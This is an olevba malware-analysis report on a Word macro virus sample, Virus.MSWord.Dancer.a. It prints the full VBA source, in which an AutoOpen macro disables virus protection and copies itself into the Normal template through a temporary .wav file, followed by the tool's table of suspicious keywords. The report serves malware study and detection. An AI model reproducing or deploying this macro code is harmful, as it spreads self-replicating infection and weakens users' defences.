olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dancer.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dancer.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO dancer.bas 
in file: Virus.MSWord.Dancer.a - OLE stream: 'Macros/VBA/dancer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
a$ = "HKEY_CURRENT_USER\dancer"
If (System.PrivateProfileString("", a$, "dancer") = False) Then
ActiveDocument.VBProject.VBComponents("dancer").Export "c:\dancer.wav"
NormalTemplate.VBProject.VBComponents.Import ("c:\dancer.wav")
System.PrivateProfileString("", a$, "dancer") = True
ElseIf ActiveDocument.VBProject.VBComponents.Item("dancer").Name <> "dancer" Then
ActiveDocument.VBProject.VBComponents.Import ("c:\dancer.wav")
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

